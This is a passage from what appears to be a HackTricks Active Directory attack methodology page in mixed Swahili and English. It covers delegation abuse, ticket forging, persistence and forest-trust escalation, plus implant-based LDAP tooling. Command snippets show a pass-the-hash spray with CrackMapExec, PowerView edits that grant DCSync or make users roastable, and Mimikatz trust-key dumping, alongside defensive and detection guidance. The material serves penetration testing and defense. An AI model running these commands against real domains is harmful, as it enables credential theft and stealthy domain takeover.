# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Kumbuka kwamba hii ni **noisy** sana na **LAPS** ingeweza **mitigate** hali hii.

### MSSQL Abuse & Trusted Links

Ikiwa user ana privileges za **access MSSQL instances**, anaweza kuzitumia **execute commands** kwenye MSSQL host (ikiwa inaendesha kama SA), **steal** NetNTLM **hash**, au hata kufanya **relay** **attack**.\
Pia, ikiwa MSSQL instance inaaminika (database link) na MSSQL instance nyingine, na user ana privileges kwenye database inayoaminika, ataweza **use the trust relationship to execute queries also in the other instance**. Trust hizi zinaweza kuunganishwa, na wakati fulani user anaweza kupata database iliyosanidiwa vibaya ambako anaweza **execute commands**.\
**Links kati ya databases hufanya kazi hata katika forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory na deployment suites mara nyingi hufichua njia zenye nguvu za kufikia credentials na code execution. Tazama:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ukipata Computer object yenye attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una domain privileges kwenye computer hiyo, utaweza **dump** TGTs kutoka memory ya kila user anayelogin kwenye computer hiyo.\
Kwa hiyo, ikiwa **Domain Admin analogin kwenye computer**, utaweza ku-dump TGT yake na kumu-impersonate ukitumia [Pass the Ticket](pass-the-ticket.md).\
Kwa sababu ya constrained delegation, unaweza hata **automatically compromise a Print Server** (kwa matumaini itakuwa DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa user au computer imeruhusiwa kwa "Constrained Delegation", itaweza **impersonate any user to access some services in a computer**.\
Kwa hiyo, ikiwa **compromise hash** ya user/computer huyu, utaweza **impersonate any user** (hata domain admins) ili kufikia services fulani.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na privilege ya **WRITE** kwenye Active Directory object ya remote computer huwezesha kupata code execution yenye **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

User aliye-compromise anaweza kuwa na **interesting privileges over some domain objects** zinazoweza kukuwezesha **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Kugundua **Spool service listening** ndani ya domain kunaweza **abused** ili **acquire new credentials** na **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ikiwa **other users** wana-**access** **compromised** machine, inawezekana **gather credentials from memory** na hata **inject beacons in their processes** ili kuwa-impersonate.\
Kwa kawaida users watafikia mfumo kupitia RDP, hivyo hapa kuna jinsi ya kufanya attacks kadhaa dhidi ya third-party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** hutoa mfumo wa kusimamia **local Administrator password** kwenye computers zilizojiunga na domain, na kuhakikisha password hiyo **randomized**, ni ya kipekee, na **changed** mara kwa mara. Password hizi huhifadhiwa kwenye Active Directory, na access hudhibitiwa kupitia ACLs kwa users walioidhinishwa pekee. Ukiwa na permissions za kutosha kufikia password hizi, pivoting kwenda computers nyingine huwezekana.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** kutoka kwenye compromised machine kunaweza kuwa njia ya **escalate privileges** ndani ya environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ikiwa **vulnerable templates** zimesanidiwa, inawezekana kuzitumia vibaya ili **escalate privileges**:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Baada ya kupata privileges za **Domain Admin**, au bora zaidi **Enterprise Admin**, unaweza **dump** **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Baadhi ya techniques zilizojadiliwa awali zinaweza kutumika kwa persistence.\
Kwa mfano unaweza:

- Kuwafanya users wawe vulnerable kwa [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kuwafanya users wawe vulnerable kwa [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Kumpa user privileges za [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** huunda **legitimate Ticket Granting Service (TGS) ticket** kwa service maalum kwa kutumia **NTLM hash** (kwa mfano, **hash ya PC account**). Njia hii hutumika **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** huhusisha attacker kupata **NTLM hash ya krbtgt account** katika mazingira ya Active Directory (AD). Account hii ni maalum kwa sababu hutumika kusign **Ticket Granting Tickets (TGTs)** zote, ambazo ni muhimu kwa authentication ndani ya AD network.

Baada ya attacker kupata hash hii, anaweza kuunda **TGTs** kwa account yoyote atakayo (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi zinafanana na golden tickets zilizoforged kwa njia inayoweza **bypass common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Kuwa na certificates za account au kuweza kuzi-request** ni njia nzuri sana ya kudumisha persistence kwenye account ya user (hata akibadilisha password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Kutumia certificates pia kunawezesha kudumisha persistence kwa privileges za juu ndani ya domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Object ya **AdminSDHolder** katika Active Directory huhakikisha usalama wa **privileged groups** (kama Domain Admins na Enterprise Admins) kwa kutumia **Access Control List (ACL)** ya kawaida kwenye groups hizi ili kuzuia mabadiliko yasiyoidhinishwa. Hata hivyo, feature hii inaweza kutumiwa vibaya; ikiwa attacker atabadilisha ACL ya AdminSDHolder ili kumpa user wa kawaida full access, user huyo atapata control kubwa juu ya privileged groups zote. Hatua hii ya usalama, iliyokusudiwa kulinda, inaweza hivyo kusababisha access isiyofaa isipofuatiliwa kwa karibu.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Ndani ya kila **Domain Controller (DC)**, kuna **local administrator** account. Kwa kupata admin rights kwenye machine kama hiyo, hash ya local Administrator inaweza kutolewa kwa kutumia **mimikatz**. Baada ya hapo, registry modification inahitajika ili **enable the use of this password**, na hivyo kuruhusu remote access kwenye local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Unaweza **kumpa** **user** baadhi ya **special permissions** juu ya domain objects maalum, ambazo zitamruhusu user huyo **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** hutumika **kuhifadhi** **permissions** ambazo **object** inazo **juu ya** **object** nyingine. Ikiwa unaweza kufanya **mabadiliko madogo** tu kwenye **security descriptor** ya object, unaweza kupata privileges muhimu sana juu ya object hiyo bila kuhitaji kuwa member wa privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Tumia vibaya auxiliary class `dynamicObject` kuunda principals/GPOs/DNS records zenye muda mfupi kwa kutumia `entryTTL`/`msDS-Entry-Time-To-Die`; hujifuta zenyewe bila tombstones, na kufuta ushahidi wa LDAP huku zikiziacha SIDs zilizoachwa, references za `gPLink` zilizovunjika, au cached DNS responses (kwa mfano, AdminSDHolder ACE pollution au redirects hasidi za `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** kwenye memory ili kuweka **universal password**, na hivyo kutoa access kwa domain accounts zote.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **capture** kwa **clear text** **credentials** zinazotumika kufikia machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Husajili **Domain Controller mpya** kwenye AD na kuitumia **push attributes** (SIDHistory, SPNs...) kwenye objects maalum bila kuacha **logs** zozote kuhusu **modifications**. Unahitaji privileges za **DA** na lazima uwe ndani ya **root domain**.\
Kumbuka kwamba ukitumia data isiyo sahihi, logs mbaya sana zitaonekana.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Awali tulijadili jinsi ya **escalate privileges** ikiwa una **permission ya kutosha kusoma LAPS passwords**. Hata hivyo, password hizi pia zinaweza kutumika **maintain persistence**.\
Tazama:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft huichukulia **Forest** kama security boundary. Hii ina maana kwamba **compromising a single domain could potentially lead to the entire Forest being compromised**.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni security mechanism inayomwezesha user kutoka **domain** moja kufikia resources katika **domain** nyingine. Kimsingi huunda muunganisho kati ya authentication systems za domains hizo mbili, na kuruhusu authentication verifications kupita bila usumbufu. Domains zinapoweka trust, hubadilishana na kuhifadhi **keys** maalum ndani ya **Domain Controllers (DCs)** zao, ambazo ni muhimu kwa uadilifu wa trust hiyo.

Katika hali ya kawaida, ikiwa user anataka kufikia service kwenye **trusted domain**, lazima kwanza aombe ticket maalum inayoitwa **inter-realm TGT** kutoka kwa DC ya domain yake. TGT hii hufichwa kwa **key** iliyoshirikiwa na domains zote mbili. Kisha user hupeleka TGT hii kwa **DC ya trusted domain** ili kupata service ticket (**TGS**). Baada ya DC ya trusted domain kuthibitisha inter-realm TGT, hutoa TGS inayompa user access kwa service.

**Steps**:

1. **Client computer** katika **Domain 1** huanza mchakato kwa kutumia **NTLM hash** yake kuomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)**.
2. DC1 hutoa TGT mpya ikiwa client ime-authenticate successfully.
3. Kisha client huomba **inter-realm TGT** kutoka DC1, inayohitajika kufikia resources katika **Domain 2**.
4. Inter-realm TGT hufichwa kwa **trust key** iliyoshirikiwa kati ya DC1 na DC2 kama sehemu ya two-way domain trust.
5. Client hupeleka inter-realm TGT kwenye **Domain Controller (DC2) ya Domain 2**.
6. DC2 huthibitisha inter-realm TGT kwa kutumia shared trust key yake na, ikiwa ni valid, hutoa **Ticket Granting Service (TGS)** kwa server katika Domain 2 ambayo client inataka kufikia.
7. Hatimaye, client huwasilisha TGS hii kwa server, ambayo imefichwa kwa server's account hash, ili kupata access kwa service katika Domain 2.

### Different trusts

Ni muhimu kutambua kwamba **trust inaweza kuwa ya upande 1 au pande 2**. Katika chaguo la pande 2, domains zote mbili zitaaminiana; lakini katika relationship ya **trust ya upande 1**, domain moja itakuwa **trusted** na nyingine **trusting**. Katika hali ya mwisho, **utaweza tu kufikia resources ndani ya trusting domain kutoka trusted domain**.

Ikiwa Domain A inaiamini Domain B, A ndiyo trusting domain na B ndiyo trusted domain. Zaidi ya hayo, katika **Domain A**, hii itakuwa **Outbound trust**; na katika **Domain B**, itakuwa **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Huu ni mpangilio wa kawaida ndani ya forest moja, ambapo child domain huwa na two-way transitive trust na parent domain yake automatically. Kimsingi, hii ina maana kwamba authentication requests zinaweza kupita bila usumbufu kati ya parent na child.
- **Cross-link Trusts**: Zinazojulikana kama "shortcut trusts", huwekwa kati ya child domains ili kuharakisha referral processes. Katika forests changamano, authentication referrals kwa kawaida lazima zipitie forest root, kisha zishuke hadi target domain. Kwa kuunda cross-links, safari hiyo hupunguzwa, jambo ambalo ni muhimu hasa katika environments zilizotawanyika kijiografia.
- **External Trusts**: Huwekwa kati ya domains tofauti zisizohusiana na kwa asili si transitive. Kulingana na [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts ni muhimu kwa kufikia resources katika domain iliyo nje ya current forest ambayo haijaunganishwa kwa forest trust. Usalama huimarishwa kupitia SID filtering kwenye external trusts.
- **Tree-root Trusts**: Trust hizi huanzishwa automatically kati ya forest root domain na tree root mpya iliyoongezwa. Ingawa hazionekani mara nyingi, tree-root trusts ni muhimu kwa kuongeza domain trees mpya kwenye forest, na kuziwezesha kudumisha unique domain name pamoja na kuhakikisha two-way transitivity. Maelezo zaidi yanapatikana katika [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni two-way transitive trust kati ya forest root domains mbili, na pia hulazimisha SID filtering ili kuimarisha security measures.
- **MIT Trusts**: Trust hizi huanzishwa na Kerberos domains zisizo za Windows, zinazotii [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts ni specialized zaidi na hulenga environments zinazohitaji integration na Kerberos-based systems nje ya Windows ecosystem.

#### Other differences in **trusting relationships**

- Trust relationship inaweza pia kuwa **transitive** (A inaiamini B, B inaiamini C, hivyo A inaiamini C) au **non-transitive**.
- Trust relationship inaweza kusanidiwa kama **bidirectional trust** (zinaaminiana) au **one-way trust** (moja pekee inaiamini nyingine).

### Attack Path

1. **Enumerate** trusting relationships
2. Angalia ikiwa **security principal** yoyote (user/group/computer) ina **access** kwa resources za **domain nyingine**, labda kupitia ACE entries au kwa kuwa kwenye groups za domain nyingine. Tafuta **relationships across domains** (huenda trust iliundwa kwa sababu hii).
1. Kerberoast katika hali hii inaweza kuwa option nyingine.
3. **Compromise** **accounts** zinazoweza **pivot** kupitia domains.

Attackers wanaoweza kufikia resources katika domain nyingine hutumia mechanisms tatu kuu:

- **Local Group Membership**: Principals wanaweza kuongezwa kwenye local groups kwenye machines, kama vile “Administrators” group kwenye server, na kuwapa control kubwa juu ya machine hiyo.
- **Foreign Domain Group Membership**: Principals pia wanaweza kuwa members wa groups ndani ya foreign domain. Hata hivyo, ufanisi wa njia hii hutegemea aina ya trust na scope ya group.
- **Access Control Lists (ACLs)**: Principals wanaweza kutajwa kwenye **ACL**, hasa kama entities katika **ACEs** ndani ya **DACL**, na hivyo kupewa access kwa resources maalum. Kwa wanaotaka kuelewa zaidi mechanics za ACLs, DACLs, na ACEs, whitepaper inayoitwa “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni resource muhimu sana.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Unaweza kuangalia **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** ili kupata foreign security principals katika domain. Hawa watakuwa user/group kutoka **external domain/forest**.

Unaweza kuangalia hili katika **Bloodhound** au kwa kutumia powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Njia nyingine za kuorodhesha domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Kuna **2 trusted keys**, moja kwa _Child --> Parent_ na nyingine kwa _Parent_ --> _Child_.\
> Unaweza kupata ile inayotumiwa na domain ya sasa kwa:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate hadi Enterprise admin katika child/parent domain kwa kutumia trust kupitia SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Kuelewa jinsi Configuration NC inavyoweza kutumiwa ni muhimu. Configuration NC hutumika kama hifadhi kuu ya data ya usanidi katika forest kwenye mazingira ya Active Directory (AD). Data hii inareplicate kwa kila Domain Controller (DC) ndani ya forest, huku DC zinazoweza kuandikwa zikiweka nakala inayoweza kuandikwa ya Configuration NC. Ili kutumia hili, ni lazima uwe na **SYSTEM privileges kwenye DC**, ikiwezekana child DC.

**Link GPO to root DC site**

Container ya Sites ya Configuration NC ina taarifa kuhusu sites za kompyuta zote zilizojiunga na domain ndani ya AD forest. Kwa kutumia SYSTEM privileges kwenye DC yoyote, attackers wanaweza ku-link GPOs kwenye root DC sites. Hatua hii inaweza kucompromise root domain kwa kubadilisha policies zinazotumika kwenye sites hizi.

Kwa maelezo ya kina, mtu anaweza kusoma utafiti kuhusu [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

Attack vector moja inalenga gMSAs zenye privileges ndani ya domain. KDS Root key, ambayo ni muhimu kwa kukokotoa passwords za gMSAs, huhifadhiwa ndani ya Configuration NC. Ukiwa na SYSTEM privileges kwenye DC yoyote, inawezekana kufikia KDS Root key na kukokotoa passwords za gMSA yoyote katika forest nzima.

Uchambuzi wa kina na mwongozo wa hatua kwa hatua unapatikana kwenye:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Utafiti wa ziada wa nje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Njia hii inahitaji subira, ukisubiri kuundwa kwa AD objects mpya zenye privileges. Kwa SYSTEM privileges, attacker anaweza kubadilisha AD Schema ili kumpa user yeyote udhibiti kamili wa classes zote. Hili linaweza kusababisha access na control isiyoidhinishwa juu ya AD objects mpya zitakazoundwa.

Maelezo zaidi yanapatikana kwenye [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

Vulnerability ya ADCS ESC5 inalenga udhibiti wa Public Key Infrastructure (PKI) objects ili kuunda certificate template inayowezesha authentication kama user yeyote ndani ya forest. Kwa kuwa PKI objects zinapatikana ndani ya Configuration NC, kucompromise child DC inayoweza kuandikwa huwezesha kutekeleza ESC5 attacks.

Maelezo zaidi yanaweza kusomwa kwenye [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Katika scenarios zisizo na ADCS, attacker ana uwezo wa kusanidi components zinazohitajika, kama ilivyoelezwa kwenye [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Katika hali hii **domain yako inaaminiwa** na domain ya nje, ambayo inakupa **ruhusa zisizoamuliwa** juu yake. Utahitaji kubaini **ni principals gani za domain yako zilizo na ufikiaji gani kwenye domain ya nje**, kisha ujaribu kuitumia vibaya:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domain ya Forest ya Nje - Njia Moja (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Katika hali hii **domain yako** ina **trust** baadhi ya **privileges** kwa principal kutoka **domains tofauti**.

Hata hivyo, wakati **domain inaaminiwa** na domain inayoamini, domain inayoaminiwa **huunda user** mwenye **jina linalotabirika** na anayetumia **trusted password** kama **password**. Hii inamaanisha kwamba inawezekana **kuingia kwenye user kutoka domain inayoamini ili kuingia ndani ya domain inayoaminiwa**, kui-enumerate na kujaribu ku-escalate privileges zaidi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya ku-compromise domain inayoaminiwa ni kupata [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyoundwa katika **mwelekeo ulio kinyume** wa domain trust (jambo ambalo si la kawaida sana).

Njia nyingine ya ku-compromise domain inayoaminiwa ni kusubiri kwenye machine ambayo **user kutoka domain inayoaminiwa anaweza kuifikia** ili ku-login kupitia **RDP**. Kisha, attacker anaweza ku-inject code kwenye process ya RDP session na **kufikia origin domain ya victim** kutoka hapo.\
Zaidi ya hayo, ikiwa **victim alikuwa amemount hard drive yake**, attacker anaweza kutumia process ya **RDP session** kuhifadhi **backdoors** kwenye **startup folder ya hard drive**. Technique hii inaitwa **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Uzuiaji wa domain trust abuse

### **SID Filtering:**

- Hatari ya attacks zinazotumia SID history attribute kwenye forest trusts inapunguzwa na SID Filtering, ambayo huwashwa kwa default kwenye inter-forest trusts zote. Hili linategemea dhana kwamba intra-forest trusts ni salama, kwa kuichukulia forest, badala ya domain, kama security boundary kulingana na msimamo wa Microsoft.
- Hata hivyo, kuna changamoto: SID filtering inaweza kuvuruga applications na user access, hivyo wakati mwingine huzimwa.

### **Selective Authentication:**

- Kwa inter-forest trusts, kutumia Selective Authentication huhakikisha kwamba users kutoka forests hizo mbili hawa-authenticate automatically. Badala yake, permissions za wazi zinahitajika ili users waweze kufikia domains na servers zilizo ndani ya trusting domain au forest.
- Ni muhimu kutambua kwamba hatua hizi hazilindi dhidi ya exploitation ya writable Configuration Naming Context (NC) au attacks dhidi ya trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse kutoka kwa On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, na `get-groupmembers` hu-resolve short names/OU paths kuwa full DNs na ku-dump objects zinazohusika.
- `get-object`, `get-attribute`, na `get-domaininfo` huvuta arbitrary attributes (ikiwemo security descriptors) pamoja na forest/domain metadata kutoka `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, na `get-rbcd` huonyesha roasting candidates, delegation settings, na descriptors zilizopo za [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) moja kwa moja kutoka LDAP.
- `get-acl` na `get-writable --detailed` hu-parse DACL ili kuorodhesha trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), na inheritance, hivyo kutoa targets za haraka za ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) humwezesha operator kuandaa principals mpya au machine accounts mahali popote ambapo ruhusa za OU zinapatikana. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` huteka moja kwa moja targets mara tu Write-Property rights zinapopatikana.
- Amri zinazolenga ACL kama vile `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` hubadilisha WriteDACL/WriteOwner kwenye AD object yoyote kuwa password resets, udhibiti wa group membership, au DCSync replication privileges bila kuacha PowerShell/ADSI artifacts. Visawe vya `remove-*` husafisha ACEs zilizodungwa.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` hufanya compromised user awe Kerberoastable mara moja; `add-asreproastable` (UAC toggle) humuweka kwa AS-REP roasting bila kugusa password.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) huandika upya `msDS-AllowedToDelegateTo`, UAC flags, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwenye beacon, kuwezesha constrained/unconstrained/RBCD attack paths na kuondoa hitaji la remote PowerShell au RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` hudunga privileged SIDs kwenye SID history ya controlled principal (angalia [SID-History Injection](sid-history-injection.md)), ikitoa stealthy access inheritance kikamilifu kupitia LDAP/LDAPS.
- `move-object` hubadilisha DN/OU ya computers au users, na kumruhusu attacker kuvuta assets hadi kwenye OUs ambako delegated rights tayari zinapatikana kabla ya kutumia vibaya `set-password`, `add-groupmember`, au `add-spn`.
- Amri za removal zilizowekewa scope finyu (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, n.k.) huruhusu rollback ya haraka baada ya operator kuvuna credentials au persistence, na kupunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Baadhi ya Defenses za Jumla

[**Jifunze zaidi kuhusu jinsi ya kulinda credentials hapa.**](../stealing-credentials/credentials-protections.md)

### **Hatua za Defensive za Kulinda Credentials**

- **Vikwazo kwa Domain Admins**: Inapendekezwa kwamba Domain Admins waruhusiwe ku-login kwenye Domain Controllers pekee, ili kuepuka matumizi yao kwenye hosts nyingine.
- **Privileges za Service Accounts**: Services hazipaswi kuendeshwa kwa Domain Admin (DA) privileges ili kudumisha security.
- **Temporal Privilege Limitation**: Kwa tasks zinazohitaji DA privileges, muda wake unapaswa kupunguzwa. Hili linaweza kufanywa kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Kagua Event IDs 2889/3074/3075 kisha utekeleze LDAP signing pamoja na LDAPS channel binding kwenye DCs/clients ili kuzuia LDAP MITM/relay attempts.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Ikiwa unataka kugundua AD tradecraft ya kawaida, **usitegemee tu operator-controlled artifacts** kama vile renamed binaries, service names, temp batch files, au output paths. Weka baseline ya jinsi Windows clients halali huunda traffic ya [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, na WMI, kisha tafuta **implementation quirks** zinazosalia hata baada ya operator kuhariri `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, au `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **High-confidence standalone candidates** (baada ya kuzithibitisha dhidi ya baseline yako):
- Authenticated DCE/RPC inayotumia `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding iliyojazwa `0xff`
- LDAP Kerberos binds zinazoweka raw Kerberos `AP-REQ` moja kwa moja ndani ya SPNEGO `mechToken`
- SMB2/3 negotiate requests zenye `ClientGuid` zinazoonekana kama ASCII
- WMI `IWbemLevel1Login::NTLMLogin` inayotumia namespace isiyo ya kawaida `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Bora zaidi kama correlation/scoring features**:
- Sparse au duplicated Kerberos etype lists, `PA-DATA` zisizo za kawaida/zinazokosekana, au TGS-REQ etype ordering inayotofautiana na native Windows
- NTLM Type 1 messages zinazokosa version info au Type 3 messages zenye null host names
- Raw NTLMSSP inayobebwa kwenye DCE/RPC badala ya SPNEGO, DCE/RPC verification trailers zinazokosekana, au SPNEGO/Kerberos OID mismatches
- Traits kadhaa kati ya hizi kutoka kwa host/user/session/time window moja zina nguvu zaidi sana kuliko field moja dhaifu
- **Tumia kama enrichment, si kama standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, na tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Hivi ni rahisi kwa operators kuvibadilisha na hutumika vizuri zaidi kueleza kwa nini cross-protocol cluster inatia shaka
- **Operational notes**:
